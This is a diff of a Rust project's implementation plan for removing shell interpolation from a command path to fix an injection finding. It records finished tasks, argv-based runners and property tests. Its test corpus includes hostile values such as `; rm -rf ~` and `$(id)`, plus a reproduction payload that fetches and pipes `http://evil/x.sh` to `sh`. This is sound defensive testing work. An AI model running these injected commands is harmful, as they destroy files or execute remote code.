@@ -126,16 +126,21 @@ wanted, since the check it would strengthen is typo-catching.
 
 ```
 baseline/src/adapters/
-  verification.rs     CommandRunner renamed ShellRunner (tier 2 only);
-                      ProgramRunner added beside it
+  verification.rs     ShellRunner + ProcessShellRunner + ScriptedShellRunner
+                      (tier 2 only); ProgramRunner + ProcessProgramRunner
+                      + ScriptedProgramRunner + Invocation beside them
+  factory.rs          executor_for takes the program runner, not the shell
 baseline/src/actions/
   names.rs       NEW  BranchName, ScenarioName, validating Deserialize
   process.rs          LocalProcessControl builds argv; two format! calls go
+                      (one survives, as a single refspec argument)
   mod.rs              Reach, Action::reach, narrowed field types, re-exports
   wire.rs             narrow types parse at the edge; refusal by name
   executor.rs         passes narrowed types through; no logic change
 baseline/tests/
-  action_reach.rs NEW the corpus property, and the reproduction
+  action_argv.rs NEW  the corpus properties, the reproduction, and the
+                      tier-2 exemption asserted beside the rule (Arc 1)
+  action_reach.rs NEW every action is Named (Arc 3)
 probe/src/
   control.rs          the refusal path for a name this machine rejects
 probe/
@@ -150,7 +155,7 @@ panopticon/src/
 
 | # | Milestone | Done when |
 |---|---|---|
-| 1 | The shell is gone from the constructed path | The spec's reproduction runs `plumb` with a scenario argument that is one string, and executes nothing else |
+| 1 | ✅ The shell is gone from the constructed path | The spec's reproduction runs `plumb` with a scenario argument that is one string, and executes nothing else |
 | 2 | A name is a name | A branch beginning with `-` and a scenario outside the class are both refused, from the wire and from the keyboard |
 | 3 | The question cannot be skipped | A ninth action fails to compile until it answers both axes |
 | 4 | It runs for real | A capture triggered from the desktop against the Pi still runs, by name, and SESH's `surfaces` check still fails for its one reason |
@@ -159,6 +164,9 @@ panopticon/src/
 
 ## Arc 1: The shell leaves the constructed path
 
+**Shipped.** Four revisions during implementation, recorded below where
+they apply. The third is the one that mattered.
+
 ### Slice 1.1: Two runners where there was one
 
 #### Task 1: `ShellRunner` and `ProgramRunner`
@@ -166,35 +174,50 @@ panopticon/src/
 The rename is half the documentation: after it, every call site says
 which tier it is on.
 
-- [ ] Rename `CommandRunner` → `ShellRunner`, unchanged in behaviour. Its doc says it is for tier-2 values only and names the tier.
-- [ ] `ProgramRunner` — `run(&mut self, program: &str, args: &[&str], cwd: &Path) -> io::Result<CommandOutput>`. Real impl is `std::process::Command::new(program).args(args)`. **No shell on any platform**, which also ends the `cfg!(windows)` fork for this path.
-- [ ] `ScriptedProgramRunner` beside `ScriptedRunner`, recording `(program, args, cwd)` so a test asserts an invocation without performing it.
-- [ ] Both runners' docs cross-reference, so a reader arriving at either learns the other exists and why.
+**Revised during implementation: the names are symmetric.** This task
+said `ScriptedProgramRunner` would sit "beside `ScriptedRunner`", which
+would have left the tier-2 pair unnamed for its tier — and a
+`ScriptedRunner` next to a `ScriptedProgramRunner` does not say which
+tier it is on, which is this task's own stated purpose. Shipped as two
+matched pairs: `ShellRunner` with `ProcessShellRunner` and
+`ScriptedShellRunner`, `ProgramRunner` with `ProcessProgramRunner` and
+`ScriptedProgramRunner`. The extra churn is one `sed` across eight
+files; the asymmetry would have been permanent.
+
+`Invocation { program, args }` was added as the recorded type rather
+than a tuple. A test asserting an invocation is asserting *how many
+arguments there were*, which is the whole property, and a named type
+makes that assertion readable.
+
+- [x] Rename `CommandRunner` → `ShellRunner`, unchanged in behaviour. Its doc says it is for tier-2 values only and names the tier.
+- [x] `ProgramRunner` — `run(&mut self, program: &str, args: &[&str], cwd: &Path) -> io::Result<CommandOutput>`. Real impl is `std::process::Command::new(program).args(args)`. **No shell on any platform**, which also ends the `cfg!(windows)` fork for this path.
+- [x] `ScriptedProgramRunner` beside `ScriptedRunner`, recording `(program, args, cwd)` so a test asserts an invocation without performing it.
+- [x] Both runners' docs cross-reference, so a reader arriving at either learns the other exists and why.
 
 #### Task 2: The verification adapter keeps its shell, provably
 
-- [ ] `VerificationAdapter` continues to use `ShellRunner`; no behaviour change.
-- [ ] Test named for the exemption: SESH's real `cd surfaces && npm test && npm run build` reaches the shell intact, as one string. The tier-2 exemption is verified rather than assumed.
+- [x] `VerificationAdapter` continues to use `ShellRunner`; no behaviour change.
+- [x] Test named for the exemption: SESH's real `cd surfaces && npm test && npm run build` reaches the shell intact, as one string. The tier-2 exemption is verified rather than assumed.
 
 ### Slice 1.2: `LocalProcessControl` builds argv
 
 #### Task 3: `capture` becomes an invocation
 
-- [ ] `LocalProcessControl` holds a `ProgramRunner`. There is **no constructor that gives it a `ShellRunner`** — the structural half of the arc.
-- [ ] `capture(project, Some(s))` → `("plumb", ["capture", "--scenario", s])`.
-- [ ] `capture(project, None)` → `("plumb", ["capture", "--all"])`.
-- [ ] `with_plumb` still names the binary for a checkout that has not installed it.
+- [x] `LocalProcessControl` holds a `ProgramRunner`. There is **no constructor that gives it a `ShellRunner`** — the structural half of the arc.
+- [x] `capture(project, Some(s))` → `("plumb", ["capture", "--scenario", s])`.
+- [x] `capture(project, None)` → `("plumb", ["capture", "--all"])`.
+- [x] `with_plumb` still names the binary for a checkout that has not installed it.
 
 #### Task 4: `push` becomes an invocation
 
-- [ ] `push(project, branch)` → `("git", ["push", "origin", &format!("{branch}:{branch}")])`.
-- [ ] A comment records that the surviving `format!` is correct: it builds **one argv element**, and the defect was never string formatting but string formatting into an interpreter. Without this, a later reader removes it as a leftover.
+- [x] `push(project, branch)` → `("git", ["push", "origin", &format!("{branch}:{branch}")])`.
+- [x] A comment records that the surviving `format!` is correct: it builds **one argv element**, and the defect was never string formatting but string formatting into an interpreter. Without this, a later reader removes it as a leftover.
 
 #### Task 5: The existing assertions are rewritten, not deleted
 
-- [ ] `pushing_names_the_remote_and_both_ends_of_the_refspec` asserts the argv form. **The refspec decision it encodes is still correct** — a bare `git push` means whatever `push.default` says — and still needs a test.
-- [ ] `capturing_one_scenario_names_it` and `capturing_without_a_scenario_captures_every_one` likewise.
-- [ ] `every_command_runs_in_the_project_root` and the non-zero-exit test carry over to `ProgramRunner`.
+- [x] `pushing_names_the_remote_and_both_ends_of_the_refspec` asserts the argv form. **The refspec decision it encodes is still correct** — a bare `git push` means whatever `push.default` says — and still needs a test.
+- [x] `capturing_one_scenario_names_it` and `capturing_without_a_scenario_captures_every_one` likewise.
+- [x] `every_command_runs_in_the_project_root` and the non-zero-exit test carry over to `ProgramRunner`.
 
 ### Slice 1.3: The property, and the reproduction
 
@@ -204,15 +227,43 @@ The test the arc exists to make possible, and the shape
 `tests/rendering.rs` already uses for escapes — a property, not three
 habits.
 
-- [ ] A hostile corpus: `; rm -rf ~`, `$(id)`, backticks, `| sh`, `&& curl`, newline, NUL, a leading `-`, `../..`, and a benign control for contrast.
-- [ ] The property, over **every `Action` variant and every string field**: under a recording `ProgramRunner`, each corpus value either appears as exactly one complete argv element or is refused before execution — and no `ShellRunner` is invoked on any path.
-- [ ] Exhaustive over the variant list by construction, so a ninth action joins the corpus without anyone remembering to add it.
+**Revised during implementation: shape invariance was not enough, and
+the property as planned would have passed a real regression.**
+
+The plan's property was that a payload never changes an invocation's
+*shape* — same program, same argument count. That is true and it is
+half the claim. The half it misses was found by deliberately injecting
+the most plausible regression rather than reasoning about it: re-joining
+the arguments into a single `capture --scenario {s}`. That keeps the
+program and the argument count identical for every payload, so the
+shape property accepts it — and `sh -c` would have run both halves of
+the payload again. Only the exact-assertion reproduction caught it.
+
+So a second property was added: **an argument that carries an untrusted
+value is built from that value and nothing else.** The refspec is the
+one composition the platform performs, and it is named in a list rather
+than pattern-matched, so a second composition has to be added
+deliberately. With both properties in place the injected regression
+fails three tests instead of one.
+
+Worth stating as a general lesson, since it will recur in Arc 2: a
+property test is only as good as the regression someone actually tried
+against it. Writing the property and watching it pass is not evidence.
+
+**Also revised:** the test file is `baseline/tests/action_argv.rs`, not
+`action_reach.rs`. `Reach` arrives in Arc 3, and naming an Arc 1 file
+for a type that does not exist yet would have read as a forward
+reference nobody could follow. Arc 3's tests get `action_reach.rs`.
+
+- [x] A hostile corpus: `; rm -rf ~`, `$(id)`, backticks, `| sh`, `&& curl`, newline, NUL, a leading `-`, `../..`, and a benign control for contrast.
+- [x] The property, over **every `Action` variant and every string field**: under a recording `ProgramRunner`, each corpus value either appears as exactly one complete argv element or is refused before execution — and no `ShellRunner` is invoked on any path.
+- [x] Exhaustive over the variant list by construction, so a ninth action joins the corpus without anyone remembering to add it.
 
 #### Task 7: The reproduction becomes a regression test
 
-- [ ] Named for the finding, carrying the spec's payload verbatim: a `TriggerCapture` whose scenario is `cockpit-work; curl -s http://evil/x.sh | sh`, built through `ActionRequest::new` so the shape stays the platform's own.
-- [ ] Asserts the whole payload arrives as **one** argument to `plumb`, and that nothing else runs.
-- [ ] After Arc 2 this same input is refused earlier, by name. The test is updated then, not weakened — Task 11 says so.
+- [x] Named for the finding, carrying the spec's payload verbatim: a `TriggerCapture` whose scenario is `cockpit-work; curl -s http://evil/x.sh | sh`, built through `ActionRequest::new` so the shape stays the platform's own.
+- [x] Asserts the whole payload arrives as **one** argument to `plumb`, and that nothing else runs.
+- [x] After Arc 2 this same input is refused earlier, by name. The test is updated then, not weakened — Task 11 says so.
 
 ---
 
@@ -285,6 +336,14 @@ habits.
 - [ ] Test, exhaustive over the variant list: every action reports `Named`.
 - [ ] Test asserting the wildcard's absence in the shape of the existing compile-fail guards, so the exhaustiveness is a property rather than a habit.
 - [ ] `DispatchAgentRun` and `StopAgentRun` are `Named` **because their strings will be passed as arguments**, not because `dispatch`/`stop` currently return `Unsupported`. The doc says so: safe-by-deferral is not the claim being made, and the harness arc must not be able to read it as one.
+
+  **Half of this landed early, in Arc 1.** The note belongs on `Reach`
+  and still does — but a harness author reads `dispatch` first, and
+  would have met its deferral comment with no warning attached to it.
+  So `LocalProcessControl::dispatch` now carries the other half: being
+  unimplemented is not what makes `prompt` safe, no validator can
+  narrow free text, and what contains it is that it is passed as one
+  argument to a program. Arc 3 still owes the `Reach` half.
 
 ---
 
